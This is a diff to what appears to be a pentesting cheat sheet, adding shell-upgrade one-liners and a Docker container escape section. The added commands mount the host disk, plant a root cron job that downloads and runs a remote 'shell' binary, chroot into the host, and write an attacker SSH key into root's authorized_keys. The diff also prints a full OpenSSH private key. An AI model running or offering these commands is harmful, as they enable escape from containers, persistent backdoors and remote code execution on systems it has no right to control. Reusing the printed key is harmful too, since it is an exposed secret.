@@ -9,11 +9,23 @@
 === "python"
 
 	``` bash
-	python -c 'import pty; pty.spawn("/bin/bash")'
+	python3 -c 'import pty; pty.spawn("/bin/sh")'
+	```
+
+	``` bash
+	python3 -c 'import pty; pty.spawn("/usr/bin/sh")'
+	```
+
+	``` bash
+	python3 -c 'import pty; pty.spawn("/bin/zsh")'
 	```
 
 	``` bash
 	python3 -c 'import pty; pty.spawn("/bin/bash")'
+	```
+
+	``` bash
+	python -c 'import pty; pty.spawn("/bin/bash")'
 	```
 
 === "script"
@@ -533,13 +545,15 @@ echo 'import os;os.system("chmod 777 /etc/passwd")' > controller.py
 
 ## Docker container
 
+### Check being a container
+
 ``` bash
 root@315d7648a173:/# ls -lah
 <snip>
 -rwxr-xr-x   1 root root    0 Jun  9 13:01 .dockerenv
 ```
 
-Mount disk to docker machine.
+### Mount disk to docker machine.
 
 ``` bash
 mkdir -p /mnt/hola
@@ -550,6 +564,85 @@ mount /dev/sda1 /mnt/hola
 mount /dev/sda2 /mnt/hola
 mount /dev/sda3 /mnt/hola
 ```
+
+### After mounted
+
+Add cron job: https://github.com/MauroEldritch/GEVAUDAN/blob/master/gevaudan.rb
+
+``` bash
+/sbin/mount.glusterfs ip:/gluster_shared_storage /tmp/x
+```
+
+``` bash
+echo '* * * * * root /bin/bash -c "/usr/bin/wget http://ip/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell"' > /tmp/x/snaps/gcron_enabled
+```
+
+Change root directory
+
+``` bash
+mkdir /hdd && mount /dev/sda1 /hdd && chroot /hdd
+```
+
+Add ssh public key
+
+=== "Gen key"
+
+	``` bash
+	ssh-keygen -t rsa
+	```
+
+	``` bash
+	echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAA ...key...' > /mnt/hola/root/.ssh/authorized_keys
+	```
+
+=== "id_rsa.pub"
+
+	``` txt
+	ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+SK1375peajAYzOZIWV/zjsUPDs9+hxk5Ggo+cKAQKg3uImvEmQtuJKrygU03RE8EVtPw5HuViM70NLVLK2H4iSkUSSp33nWkIq1kz0yJksiKjlx2h0eXzBwQ7zeymFNr4oRvpigwEXnScOY39040h3xTqa7RikYVP4h25TtfhNExVtaZRzO6dDJSTTZurg81lkwvILHY9vw77TBP1Vsa4htYcufPKoxUDId3JllPO7Q6UTjGvlLjVf0az9Q0Kpe/D3PsAM/Wn+gCbsBkzgJ1Jhx+BFbakXto3mgdGsh3fbOLsFTX8+XTLaZNFa/faIOwUcVPvteJ2gRGe2QT6A5WV53ql3uoBnNEBwkndrWtDXyKDhPdYQXrDGZc3x2GMuM2LGkZKpM3CKv7JvUhvMj/J76380khYhFj1COOfUeQPjUmuB4Kyo5ZTDfkNXrP2CirrnGiKMOv/3hHbTSlP9t0eVQdeMQfL98NwZyRwMh9c3vQEh29PJc+BflSRJRyZhE= leecybersec@kali
+	```
+
+=== "id_rsa"
+
+	``` txt
+	-----BEGIN OPENSSH PRIVATE KEY-----
+	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
+	-----END OPENSSH PRIVATE KEY-----
+	```
 
 ## Installed and Patch Levels
 
